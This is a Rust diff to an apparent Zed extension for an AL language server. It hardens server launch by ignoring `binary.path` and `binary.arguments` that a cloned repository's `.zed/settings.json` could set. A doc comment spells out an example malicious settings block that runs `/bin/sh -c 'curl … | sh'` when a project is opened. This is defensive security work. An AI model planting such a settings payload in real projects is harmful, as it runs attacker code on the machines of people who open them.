@@ -104,21 +104,61 @@ fn set_nested_value_inner(
     set_nested_value_inner(child, &path[1..], value, depth + 1);
 }
 
-/// Resolve the al-lsp launch arguments from user settings.
+/// The program and arguments the extension hands Zed for the language server.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ServerLaunch {
+    /// A program to run instead of the one the extension resolves, or `None`
+    /// when the extension chooses `al-lsp` itself. Always `None` today.
+    pub program: Option<String>,
+    /// The arguments the server starts with.
+    pub args: Vec<String>,
+}
+
+/// Decide what the language server session runs, given the settings Zed merged.
 ///
-/// Priority:
-/// 1. An explicit `binary.arguments` override always wins (power users).
-/// 2. `al.useOfficialLsp: true` (flat, dotted, or nested under `"al"`)
-///    delegates the session to Microsoft's official AL Language Server
-///    via `al-lsp --official-lsp` (requires ALTool v17+ on the machine).
-/// 3. Default: the built-in native server over stdio.
-pub fn resolve_server_args(
-    user_args: Option<Vec<String>>,
+/// `LspSettings::for_worktree` returns the user's settings and the worktree's
+/// `.zed/settings.json` already merged, and `zed_extension_api` 0.7 exposes no
+/// way to ask for the user-level value alone. So a `binary` block arriving
+/// here may be one a cloned repository wrote, and that block names a program
+/// and its arguments, which together are the whole payload: a
+/// `.zed/settings.json` holding
+/// `{"lsp":{"al-lsp":{"binary":{"path":"/bin/sh","arguments":["-c","curl … | sh"]}}}}`
+/// would run on open.
+///
+/// The extension runs in Zed's WASM sandbox with no filesystem and no process,
+/// so it cannot read `trusted-projects.json`, and `binary.path` decides whether
+/// al-lsp runs at all, so al-lsp cannot be the one to refuse it either. The
+/// rule is therefore the extension's own and it is flat: `binary.path` and
+/// `binary.arguments` are ignored, whoever wrote them. al-lsp is chosen by
+/// this extension (session cache, then `al-lsp` on PATH, then the cached or
+/// downloaded release), and its arguments come from `al.useOfficialLsp`.
+///
+/// To run a specific build, put it on PATH. Zed itself blocks project settings
+/// in an untrusted worktree from v0.218.2-pre (advisory GHSA-29cp-2hmh-hcxj);
+/// this rule is what an older Zed does not give us, and it holds on every Zed.
+///
+/// See `Docs/features/project-trust.md` and
+/// `Docs/current-limitations.md#zed-worktree-settings-and-executable-paths`.
+pub fn resolve_server_launch(
+    _settings_binary_path: Option<&str>,
+    _settings_binary_arguments: Option<&[String]>,
     user_settings: Option<&serde_json::Value>,
-) -> Vec<String> {
-    if let Some(args) = user_args {
-        return args;
+) -> ServerLaunch {
+    ServerLaunch {
+        program: None,
+        args: resolve_server_args(user_settings),
     }
+}
+
+/// Resolve the al-lsp launch arguments from the AL settings block.
+///
+/// `al.useOfficialLsp: true` (flat, dotted, or nested under `"al"`) delegates
+/// the session to Microsoft's official AL Language Server via `al-lsp
+/// --official-lsp` (requires ALTool v17+ on the machine). Otherwise the
+/// built-in native server runs over stdio.
+///
+/// `binary.arguments` is not a source here: see [`resolve_server_launch`].
+pub fn resolve_server_args(user_settings: Option<&serde_json::Value>) -> Vec<String> {
     let use_official = user_settings
         .and_then(|s| {
             s.get("useOfficialLsp")
@@ -196,6 +236,12 @@ pub fn resolve_dotnet_path(user_settings: Option<&serde_json::Value>) -> Option<
 /// Zed itself blocks project settings until a worktree is trusted, from
 /// v0.218.2-pre (advisory GHSA-29cp-2hmh-hcxj). This check is what an older
 /// Zed does not give us.
+///
+/// A false answer is not an authorisation. It says only that the program is
+/// not a file the clone carried, which leaves every program the machine
+/// already has. The language server's own program and arguments are decided by
+/// [`resolve_server_launch`], which ignores the settings outright; this check
+/// covers `dotnetPath`, where al-lsp does the rest (`trust::enforce_dotnet_path`).
 ///
 /// See `Docs/current-limitations.md#zed-worktree-settings-and-executable-paths`.
 pub fn is_worktree_resident_program(path: &str, worktree_root: &str) -> bool {
